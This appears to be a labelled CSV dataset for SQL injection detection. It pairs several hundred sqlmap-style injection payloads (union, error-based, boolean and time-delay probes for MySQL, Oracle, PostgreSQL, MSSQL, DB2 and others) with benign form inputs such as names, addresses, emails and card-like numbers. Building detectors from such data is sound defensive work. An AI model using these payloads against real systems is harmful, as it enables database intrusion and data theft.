Query,Label
"-4522"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mbkq""=""mbkq",1
"1) as wype where 6608=6608 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"-7691"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
5r34osa,0
10g2st19,0
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"calle doctor jose manuel pascual y pascual 146, 4?c",0
1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,1
alfama,0
simeon,0
"c/ del ferrocarril, 152,",0
pierpoint@youtubed.sh,0
18684547z,0
sobrino coyoma,0
deacetis,0
"1%') or 8466=benchmark(5000000,md5(0x694a4745)) and ('%'='",1
19224,0
fickes,0
39664,0
"-3282') union all select 9002,9002,9002,9002,9002#",1
largueado,0
"c/ marin garcia, 96",0
1))) and 2006=2006,1
"1') as fyuh where 7608=7608 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
patea64ra,0
"1' where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
10550,0
"-1004"" where 6266=6266 order by 1#",1
jemima,0
"-7142')) union all select 5083,5083,5083,5083#",1
6085,0
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('sstt'='sstt",1
panosh,0
19783837l,0
"-5644""))) or make_set(9354=9354,7185) and (((""evcf""=""evcf",1
42,0
cado,0
"urbanitzacio las lomas, 18, 4a",0
de buran aceijas,0
49716,0
"1%"");select * from generate_series(1488,1488,case when (1488=1685) then 1 else 0 end) limit 1--",1
"1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
1) as qgsb where 7600=7600 and 2006=2006,1
"1' where 7613=7613;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
05147,0
"1')) as bbdf where 1327=1327;iif(8354=3515,1,1/0)",1
"-4031%"" union all select 9566--",1
"1"" where 5927=5927;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
3051,0
sheng-passanante@ankawaelda.int,0
45212,0
"1"")) as ktue where 6392=6392 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
myers@naturalchild.so,0
pincel,0
"1%""));select case when 7717=7717 then 1 else null end--",1
"sant sever 63, 6-b",0
5585622963269612,0
"-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#",1
cuevas de san clemente,0
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
algabea,0
6egas0a,0
pintarrajar,0
16667079z,0
katia,0
del,0
"1') where 3450=3450 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
2366,0
8761060371713838,0
25645562x,0
perene,0
62349457e,0
"1"";select (case when (3140=4625) then 1 else 3140*(select 3140 from master..sysdatabases) end)--",1
"1""))) union all select null,null,null,null,null,null,null,null,null--",1
hallaran@manjarr.cd,0
1'||(select 'lnhq' where 7526=7526;if(7899=7899) select 7899 else drop function zbbp--,1
vieta,0
1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
5244670770446308,0
a089ar,0
neisy,0
3182733189788703,0
1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--,1
10303147k,0
jarmo,0
paniego oliva,0
1';if(7899=7899) select 7899 else drop function zbbp--,1
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""kszu""=""kszu",1
nues2ra,0
25187,0
11039917d,0
vinko,0
49660,0
"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",1
paladio,0
rosset,0
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",1
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)# jcdh",1
acomplexionada,0
natural,0
caridad,0
10665,0
enamorar,0
a8errad1r,0
1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--,1
1681429677567137,0
"1%'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('%'='",1
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('cylu'='cylu",1
"c/ torre, 23",0
"1' where 1917=1917 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"c/ narcisa freixas, 61 13?h",0
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",1
"travesia carpio y torta, 133",0
saibun,0
hecilia,0
"1')) as yyud where 4934=4934;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
78532141k,0
1%'));select pg_sleep(5)--,1
"1"" where 2878=2878 union all select null,null,null,null,null#",1
liebman6@maquillajeparalabios.va,0
walley@santacruzdelvoto.gg,0
"1%') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('%'='",1
6194,0
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""llgb"" like ""llgb",1
lacey@bwds.mp,0
albertina,0
shalom,0
homs breither,0
piel,0
5211,0
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,1
1')) as grne where 9003=9003 order by 1--,1
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"") where 2367=2367;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",1
6790,0
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'kdxg' like 'kdxg",1
4466581069575566,0
cabieces amayuela,0
9786890057742572,0
asshole,0
claudiano,0
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",1
"calle xiquets de valls, 138, 5?g",0
81506228r,0
"1,(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",1
frambueso,0
gonsalve,0
1 or sleep(5)#,1
1%') or (select * from (select(sleep(5)))sddo)#,1
28760,0
iznatoraf,0
serneo,0
"1%""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
ca1t01i4oso,0
"-8655) where 3910=3910 union all select 3910,3910#",1
"1%"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""=""",1
09610,0
viena@redesmilitantes.pg,0
claudine,0
carminante,0
ella,0
kneeshaw,0
entrala,0
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""alkz""=""alkz",1
"1' in boolean mode) and elt(1210=1210,sleep(5))#",1
daren9,0
"1' in boolean mode) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)#",1
0890605650691584,0
mikel,0
"1) where 7729=7729;iif(5257=5257,1,1/0)",1
azpilicueta eckhardt,0
"1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",1
gajanejos,0
janna,0
cherng,0
"1%"")) union all select null#",1
chaiman,0
san vicente de arvalo,0
03291016s,0
"c/ forjadores, 131",0
masao,0
es9a5raga7o,0
5849964117227978,0
"alqueria de coca 38,",0
fanny,0
caspar,0
76833580x,0
pirotto nin,0
"veronica 126,",0
"1' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1
pakulski,0
salobral,0
"1' in boolean mode) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
suany,0
gyurcsak,0
c/ espiritu santo 126,0
1'||(select 'etvo' from dual where 1557=1557;(select * from (select(sleep(5)))acdk)#,1
8081,0
chap8n,0
brigitte,0
kirov@ofertachina.fm,0
"1'))) and 2388=benchmark(5000000,md5(0x6d457153))#",1
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('mevd'='mevd",1
1%' union all select null#,1
1'+(select ntym where 4750=4750;select case when 7717=7717 then 1 else null end--,1
noami,0
kulle@coworkers.tl,0
-2214') union all select 8228#,1
howe1,0
gwynne4@inoxled.kz,0
fabra vicente,0
28737,0
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"1'||(select 'scba' where 9079=9079 and 8635=(select count(*) from generate_series(1,5000000))--",1
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",1
farraron,0
igns anzoategui,0
50sc2e3i6i1172,0
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('qomf' like 'qomf",1
9380,0
banderizar,0
estate,0
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""nthu"" like ""nthu",1
cebrones del ro,0
"1') where 5317=5317 and 8407=(select count(*) from generate_series(1,5000000))--",1
bartolom,0
buscarin,0
05130,0
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,1
bonany lambarri,0
1;begin user_lock.sleep(5); end-- podi,1
18121520g,0
1091303634326853,0
-3566%' or 2158=6289,1
neetu,0
nela,0
floriana,0
7385369805939657,0
"-1908"") where 6420=6420 union all select 6420,6420,6420,6420--",1
19461,0
"1"") where 7514=7514;select case when 7717=7717 then 1 else null end--",1
enfermamente,0
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
nadav6,0
bidaurreta,0
elivio,0
napolen,0
1' where 8584=8584 order by 1#,1
"1'||(select 'asfl' from dual where 5846=5846 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
4430,0
1'))) rlike sleep(5) and ((('zwyx'='zwyx,1
caputo,0
1299,0
miera,0
"subida san diego 8, 13?c",0
"1 where 8390=8390 and 3824=benchmark(5000000,md5(0x76555642))--",1
"1)) as klmm where 3107=3107;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
scavran@eonon.com.at,0
"calle doctor fleming 52,",0
glatzeder.karr@lamejorplaya.so,0
chiykows,0
"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (5037=5037",1
"1'+(select jidy where 2989=2989 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
7012,0
aldea del fresno,0
"1' in boolean mode) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",1
3740768702287666,0
paracuellos,0
48210,0
-9389') or 8859=3989--,1
soriguera,0
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('nopu'='nopu",1
1';(select * from (select(sleep(5)))srmq),1
5405,0
arbizu,0
kuss@inoxled.jobs,0
prspera,0
torrie,0
"masia can giro, 5",0
5886675578398805,0
1 where 4844=4844;select case when 3252=9622 then 1 else null end--,1
ilya,0
iracema,0
"1%"") and elt(1210=1210,sleep(5)) and (""%""=""",1
"1'+(select afst where 7454=7454 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",1
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",1
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""",1
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""mofa"" like ""mofa",1
"calle francisco monje, 94 13-d",0
arnaldo,0
marling,0
berroteran,0
88426780z,0
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
49893169m,0
1) as uhmm where 2304=2304 union all select null#,1
treen2,0
calaceite,0
hao,0
jan,0
7825,0
terencio,0
"c/ general merry del val, s/n",0
"carrer violas, 60,",0
64sfa4imiento,0
"1"")));select (case when (8993=8846) then 8993 else 8993*(select 8993 from mysql.db) end)#",1
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""vwep"" like ""vwep",1
"-8034"") where 1292=1292 union all select 1292,1292,1292,1292,1292#",1
1')) and 4650=1322#,1
1 where 3354=3354;begin user_lock.sleep(5); end--,1
wilson,0
7548,0
57955652e,0
6603392129925704,0
ber269u31a,0
"1'+(select 'uqaf' where 7414=7414;iif(5257=5257,1,1/0)",1
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1'));waitfor delay '0:0:5' and (('nvqf'='nvqf,1
vajentic,0
monasterio,0
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
95726092t,0
in85ecuacin,0
1 or (select * from (select(sleep(5)))ydpu),1
j6ca,0
"virgen del valsordo, 44, 3-a",0
propaganda,0
mirarchi,0
locatell@whitehat.no,0
becilla de valderaduey,0
8998,0
trbena,0
"les llometes, 97 7?f",0
-5534 or 1983=5721#,1
9008082484622624,0
callejon san felices 187,0
carrer sant joan de deu 186,0
jellison@acch-portugal.uk,0
6i4t562e7a,0
1i515s7d7d,0
38820,0
dueas cristaldo,0
6341905837989254,0
bernette2,0
cangalaya,0
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""urqg""=""urqg",1
"calle homero, 127",0
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq",1
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#,1
monteoliva pags,0
57i-9557a,0
zarlenga,0
amarilis,0
"sierra del gudar 98,",0
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",1
"paraje contador 158, 12d",0
marysia-paramor@programaciones.com.mg,0
"calle robregordo, 171 10-c",0
34126,0
2243286657629383,0
"1"") where 6859=6859 union all select null,null,null,null,null,null,null,null#",1
velichcanich pairot,0
67242195q,0
revillarruz,0
peaflor de hornija,0
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",1
botarell,0
9758111869432578,0
28430,0
sant llus,0
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'wwwb'='wwwb",1
84413002n,0
eiffel@noviasteresapalacios.coop,0
"-9382') union all select 4774,4774,4774,4774--",1
sed4e748,0
langmann@fest-tv.sd,0
"1' and 2388=benchmark(5000000,md5(0x6d457153))#",1
"1,iif(6333=1227,1,1/0)",1
fonoll zurko,0
76971829y,0
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,1
p21urit56,0
"1"") union all select null,null,null,null,null,null,null,null#",1
8179154437661538,0
9481894123052720,0
8461933657900272,0
cheyenne,0
"pobla tornesa, la",0
calle eduard toldra 137 5?a,0
jandtegui curell,0
1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--,1
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",1
"circon, 84, 13-e",0
astar@guiapolicial.lt,0
shihhai0,0
-2050' union all select 5606#,1
47651101t,0
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,1
nettleton.hamissi@estudiodeyoga.pt,0
1') or sleep(5) and ('mdmr' like 'mdmr,1
1')) as cmll where 7948=7948 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
1;begin user_lock.sleep(5); end--,1
"1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
1%') or sleep(5)#,1
co01,0
"-1631%"") or elt(8285=1709,1709) and (""%""=""",1
"1'||(select 'tmsj' where 2971=2971 union all select null,null,null,null,null,null,null,null,null,null#",1
"de santiago carrillo solares 67, 8-f",0
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",1
pche,0
tomkin,0
largar,0
santa coloma,0
pembrooke_coates@stainless.gd,0
16574331w,0
43470,0
"-2054%""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",1
31640,0
"1 where 7254=7254;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""staz"" like ""staz",1
"-2909'||(select 'qfeq' where 7062=7062 union all select 7062,7062,7062,7062,7062,7062--",1
azarshah,0
xaubet sorolla,0
pons anguita,0
malcolm,0
waldemar,0
54368029p,0
"-3852') union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1
"1'||(select 'fraa' from dual where 9140=9140 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",1
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",1
corcos,0
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,0
1'||(select 'dfmw' from dual where 1723=1723;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
sangborivutr@ssextremadura.gr,0
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
37169,0
6588349336548778,0
librilla,0
1)) as pjkd where 1105=1105 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
82,0
"1%';iif(6369=5881,1,1/0)",1
guadiana 149 6f,0
"1%"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",1
viera@elrincondelmarmol.by,0
20048048y,0
coray@ciaplast.ir,0
1') and 7533=7533 and ('cryr'='cryr,1
"1' or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"1"") where 6018=6018 and 7533=7533--",1
"1%"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
91438020w,0
"1%"") union all select null,null#",1
-t6a1niet7,0
-8028%'))) or 5042=5214,1
kenta1,0
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
2694,0
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",1
0932689894259111,0
jar49era,0
carricar,0
8541242880536778,0
repraz torrubiano,0
trintignant.iwasaki@softgold.com.np,0
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
23734,0
kingslan,0
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
1')) and (3020=3020)*6703 and (('mgfd'='mgfd,1
viataiano,0
7024918540973284,0
"-9996' or make_set(1237=7111,7111)",1
"1%'))) and elt(7425=3843,3843) and ((('%'='",1
96639593x,0
54372602g,0
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('bwka'='bwka,1
-3895') or 8645=5359--,1
"1"") or elt(6272=6272,sleep(5)) and (""fvrq""=""fvrq",1
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",1
calle juan de sevilla 102 3c,0
50332,0
5564387106032585,0
theo,0
"-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo",1
78128253j,0
"cantallops, 138,",0
"grupo fuensanta 197, 12?a",0
"plaa solsones s/n,",0
calle jose lopez tafall 192,0
"-6798%""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",1
"c/ artazuria, 43 10?e",0
1) waitfor delay '0:0:5' and (2993=2993,1
marlow@botilleria.com.ec,0
50684,0
1')));begin dbms_lock.sleep(5); end and ((('xzbk'='xzbk,1
59388065h,0
1813799559056744,0
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
butarinski_sawyer@proofreader.fj,0
drennan,0
-6217)) as hyws where 3441=3441 or 9421=4695#,1
"-8301') union all select 1806,1806--",1
85125612j,0
1' or 6793=(select 6793 from pg_sleep(5)),1
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1
-3107') where 7782=7782 or 8571=8571--,1
pizcar,0
"jabeque, 86,",0
09410,0
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('%'='",1
3609841962548925,0
donner.vai@barcafedaniss.wf,0
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,1
"c/ gustavo adolfo becquer 91,",0
10300,0
kavaler,0
samalot,0
"plaza mayor, s/n 2-g",0
2esco63enti2,0
1'+(select wgmn where 4368=4368 and 7859=6151)+',1
"-5181""))) or elt(1032=1032,3623) and (((""qofp""=""qofp",1
"1"")) order by 1--",1
empeltre,0
calle castaos 90,0
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",1
"-4980"" or (8459=8459)*4906 and ""mnlj"" like ""mnlj",1
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",1
"pl. san marcos, 0, 11f",0
c2nve3e213a,0
camp fein,0
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
kfir,0
92152955m,0
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",1
2008,0
gretal3,0
"c/ avi xaxu, 157,",0
arraigadura,0
bertorelli,0
676,0
weintraub,0
09530,0
c1ir4ia4e5a,0
alfonso.julissa@naturalchild.tk,0
kuzz,0
tejera,0
"1) as zqxa where 5718=5718 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1')) union all select null--,1
1' where 2547=2547 and 6969=(select 6969 from pg_sleep(5))--,1
e7c5c1da,0
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",1
"calle florian de ocampo 114, 7?h",0
33rb0rr55ada,0
1888,0
bukoontot@google-movil.cm,0
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'eomt'='eomt",1
-saborete,0
22997112x,0
nevel,0
choclo,0
muoz birosta,0
gdor,0
"1'+(select nzij where 5456=5456 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",1
-4523 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
1;if(7899=7899) select 7899 else drop function zbbp--,1
c/ gomera 148 3?e,0
"1)) as shmg where 1371=1371 union all select null,null,null,null,null,null,null,null,null,null#",1
"1' union all select null,null,null,null,null,null,null#",1
252,0
thibaud79,0
"1%"") waitfor delay '0:0:5' and (""%""=""",1
buttons@creacionwebs.tm,0
arn pola,0
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
van_kast,0
1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#,1
"1'||(select 'adoe' from dual where 7662=7662;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",1
albero bajo,0
albuixech,0
branden,0
9140660684303193,0
25244,0
di7a?g7r,0
"grupos 1 y 2 valladolid 178,",0
rivaherr,0
bianchi@atrioregalos.im,0
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""nwzu"" like ""nwzu",1
kaile,0
78595518x,0
45555264s,0
8i0l2,0
50316,0
halford,0
44338,0
08030,0
79856305y,0
